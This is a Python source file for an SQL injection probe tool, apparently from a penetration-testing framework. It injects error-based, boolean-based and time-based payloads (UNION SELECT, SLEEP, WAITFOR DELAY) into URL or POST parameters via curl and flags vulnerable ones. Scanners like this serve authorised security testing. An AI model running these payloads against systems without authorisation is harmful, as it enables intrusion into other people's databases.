"""SQLi Probe — quick SQL injection detector via targeted payloads."""

from __future__ import annotations

import asyncio
import logging
import re
import time
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from tools.base import ToolDefinition, ToolParam, ToolResult, registry

logger = logging.getLogger("hades.tools.sqli_probe")

_MAX_OUTPUT = 512_000
_MAX_PARAMS = 5

_SQL_ERROR_RE = re.compile(
    r"(SQL syntax|mysql_|mariadb|ORA-\d|PLS-\d|SQLSTATE|sqlite3?\.|pg_query|psycopg"
    r"|Microsoft.*ODBC|JET Database|Access Database|Unclosed quotation"
    r"|quoted string not properly terminated|You have an error in your SQL syntax"
    r"|Warning.*mysql_|PostgreSQL.*ERROR|unterminated)",
    re.IGNORECASE,
)

_ERROR_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "1 OR 1=1--",
    "' UNION SELECT NULL--",
    "1' AND '1'='1",
]

_BOOLEAN_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR '1'='1", "' OR '1'='2"),
]

_TIME_PAYLOADS = [
    ("1' AND SLEEP(3)--", "mysql"),
    ("1; WAITFOR DELAY '0:0:3'--", "mssql"),
]


class SqliProbeTool(ToolDefinition):
    name = "sqli_probe"
    binary = "curl"
    description = (
        "Quick SQL injection probe — tests parameters with common payloads "
        "and detects error-based, boolean-based, and time-based SQLi indicators"
    )
    category = "exploitation"
    risk = "medium"
    timeout = 120
    params = [
        ToolParam("url", "URL with parameter to test (e.g. https://target/page?id=1)", required=True),
        ToolParam("param", "Parameter name to test (e.g. 'id'). If empty, tests all query params"),
        ToolParam("method", "HTTP method", default="GET", choices=["GET", "POST"]),
        ToolParam("data", "POST body data template (e.g. 'username=INJECT&password=test')"),
        ToolParam("headers", "Extra headers as 'Key: Value', comma-separated"),
    ]

    # -- helpers -------------------------------------------------------------

    @staticmethod
    def _build_curl_args(
        url: str,
        method: str,
        data: str | None,
        extra_headers: list[str],
    ) -> list[str]:
        args = [
            "curl", "-s", "-k", "-X", method,
            "-w", "\n%{http_code}\n%{size_download}\n%{time_total}",
            "--max-time", "15",
        ]
        for h in extra_headers:
            args.extend(["-H", h])
        if data:
            args.extend(["-d", data])
        args.append(url)
        return args

    @staticmethod
    def _parse_curl_output(raw: str) -> tuple[str, int, int, float]:
        """Return (body, status_code, size, elapsed)."""
        lines = raw.rsplit("\n", 3)
        if len(lines) >= 4:
            body = lines[0]
            try:
                code = int(lines[1])
            except ValueError:
                code = 0
            try:
                size = int(float(lines[2]))
            except ValueError:
                size = len(body)
            try:
                elapsed = float(lines[3])
            except ValueError:
                elapsed = 0.0
            return body, code, size, elapsed
        return raw, 0, len(raw), 0.0

    async def _curl(
        self,
        url: str,
        method: str,
        data: str | None,
        extra_headers: list[str],
    ) -> tuple[str, int, int, float]:
        args = self._build_curl_args(url, method, data, extra_headers)
        proc = await asyncio.create_subprocess_exec(
            *args,
            stdin=asyncio.subprocess.DEVNULL,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            start_new_session=True,
        )
        stdout_raw, _ = await asyncio.wait_for(proc.communicate(), timeout=20)
        raw = stdout_raw.decode("utf-8", errors="replace")
        return self._parse_curl_output(raw)

    @staticmethod
    def _inject_param(url: str, param: str, payload: str, method: str, data: str | None):
        """Return (new_url, new_data) with `param` replaced by `payload`."""
        if method == "POST" and data:
            parts = data.split("&")
            new_parts = []
            for p in parts:
                if "=" in p:
                    k, _, _ = p.partition("=")
                    if k == param:
                        new_parts.append(f"{k}={payload}")
                    else:
                        new_parts.append(p)
                else:
                    new_parts.append(p)
            return url, "&".join(new_parts)
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        return new_url, data

    @staticmethod
    def _extract_params(url: str, method: str, data: str | None) -> list[str]:
        params: list[str] = []
        if method == "POST" and data:
            for chunk in data.split("&"):
                if "=" in chunk:
                    k, _, _ = chunk.partition("=")
                    if k and k not in params:
                        params.append(k)
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        for k in qs:
            if k not in params:
                params.append(k)
        return params[:_MAX_PARAMS]

    # -- main run ------------------------------------------------------------

    async def run(self, target: str, params: dict[str, Any] | None = None) -> ToolResult:
        params = params or {}
        if not self.is_available():
            return ToolResult(
                tool=self.name, target=target, success=False,
                summary=f"{self.binary} not found in PATH",
                raw_output="", error=f"{self.binary} not installed",
            )

        url = params.get("url") or target
        method = params.get("method", "GET").upper()
        data = params.get("data")
        raw_headers = params.get("headers", "")
        extra_headers: list[str] = []
        if raw_headers:
            for h in raw_headers.split(","):
                h = h.strip()
                if h:
                    extra_headers.append(h)

        test_params = (
            [params["param"]] if params.get("param")
            else self._extract_params(url, method, data)
        )
        if not test_params:
            return ToolResult(
                tool=self.name, target=target, success=False,
                summary="No query parameters found to test",
                raw_output="", error="No injectable parameters in URL or POST data",
            )

        start = time.monotonic()
        findings: list[dict] = []
        log_rows: list[str] = ["PARAM | PAYLOAD | CODE | SIZE | TIME | INDICATOR"]
        log_rows.append("-" * 80)

        # ---- baseline ----
        try:
            base_body, base_code, base_size, base_time = await self._curl(
                url, method, data, extra_headers,
            )
        except Exception as exc:
            elapsed = time.monotonic() - start
            return ToolResult(
                tool=self.name, target=target, success=False,
                summary=f"Baseline request failed: {exc}",
                raw_output="", duration=elapsed, error=str(exc),
            )

        log_rows.append(f"BASELINE | (original) | {base_code} | {base_size} | {base_time:.2f}s | -")

        for pname in test_params:
            # -- error-based --
            for payload in _ERROR_PAYLOADS:
                try:
                    inj_url, inj_data = self._inject_param(url, pname, payload, method, data)
                    body, code, size, elapsed_req = await self._curl(
                        inj_url, method, inj_data, extra_headers,
                    )
                except Exception:
                    continue

                indicator = ""
                match = _SQL_ERROR_RE.search(body)
                if match:
                    snippet = match.group(0)[:120]
                    indicator = f"SQL_ERROR: {snippet}"
                    severity = "high" if len(snippet) > 20 else "medium"
                    findings.append({
                        "injection_type": "error",
                        "parameter": pname,
                        "payload": payload,
                        "evidence": snippet,
                        "url": inj_url,
                        "severity": severity,
                    })

                log_rows.append(
                    f"{pname} | {payload!r:30s} | {code} | {size} | {elapsed_req:.2f}s | {indicator or '-'}"
                )

            # -- boolean-based --
            for true_pl, false_pl in _BOOLEAN_PAIRS:
                try:
                    t_url, t_data = self._inject_param(url, pname, true_pl, method, data)
                    t_body, t_code, t_size, t_time = await self._curl(
                        t_url, method, t_data, extra_headers,
                    )
                    f_url, f_data = self._inject_param(url, pname, false_pl, method, data)
                    f_body, f_code, f_size, f_time = await self._curl(
                        f_url, method, f_data, extra_headers,
                    )
                except Exception:
                    continue

                indicator = ""
                size_diff = abs(t_size - f_size)
                code_diff = t_code != f_code

                if (size_diff > 50 and size_diff / max(t_size, f_size, 1) > 0.10) or code_diff:
                    evidence_parts = []
                    if code_diff:
                        evidence_parts.append(f"status {t_code} vs {f_code}")
                    if size_diff > 50:
                        evidence_parts.append(f"size {t_size} vs {f_size} (diff {size_diff})")
                    indicator = "BOOLEAN: " + "; ".join(evidence_parts)
                    findings.append({
                        "injection_type": "boolean",
                        "parameter": pname,
                        "payload": f"TRUE={true_pl} / FALSE={false_pl}",
                        "evidence": "; ".join(evidence_parts),
                        "url": t_url,
                        "severity": "high",
                    })

                log_rows.append(
                    f"{pname} | TRUE={true_pl!r:20s} | {t_code} | {t_size} | {t_time:.2f}s | {indicator or '-'}"
                )
                log_rows.append(
                    f"{pname} | FALSE={false_pl!r:20s} | {f_code} | {f_size} | {f_time:.2f}s | "
                )

            # -- time-based --
            for time_pl, db_hint in _TIME_PAYLOADS:
                try:
                    tm_url, tm_data = self._inject_param(url, pname, time_pl, method, data)
                    _, tm_code, tm_size, tm_elapsed = await self._curl(
                        tm_url, method, tm_data, extra_headers,
                    )
                except Exception:
                    continue

                indicator = ""
                if tm_elapsed > 3.0 and base_time < 2.0:
                    indicator = f"TIME_DELAY: {tm_elapsed:.2f}s (baseline {base_time:.2f}s) [{db_hint}]"
                    findings.append({
                        "injection_type": "time",
                        "parameter": pname,
                        "payload": time_pl,
                        "evidence": f"Response took {tm_elapsed:.2f}s vs baseline {base_time:.2f}s",
                        "url": tm_url,
                        "severity": "high",
                        "db_hint": db_hint,
                    })

                log_rows.append(
                    f"{pname} | {time_pl!r:30s} | {tm_code} | {tm_size} | {tm_elapsed:.2f}s | {indicator or '-'}"
                )

        total_time = time.monotonic() - start

        # -- summary --
        confirmed = [f for f in findings if f.get("severity") == "high"]
        possible = [f for f in findings if f.get("severity") == "medium"]

        if confirmed:
            types_found = sorted({f["injection_type"] for f in confirmed})
            summary = (
                f"SQLi CONFIRMED — {len(confirmed)} high-severity injection point(s) "
                f"({', '.join(types_found)}) in {len(test_params)} parameter(s) tested"
            )
        elif possible:
            summary = (
                f"SQLi POSSIBLE — {len(possible)} medium-severity indicator(s) "
                f"(error disclosure) in {len(test_params)} parameter(s) tested"
            )
        else:
            summary = f"No SQLi indicators found in {len(test_params)} parameter(s) tested"

        raw_output = "\n".join(log_rows)

        return ToolResult(
            tool=self.name,
            target=target,
            success=True,
            summary=summary,
            raw_output=raw_output[:_MAX_OUTPUT],
            findings=findings,
            duration=total_time,
            exit_code=0,
        )


registry.register(SqliProbeTool())
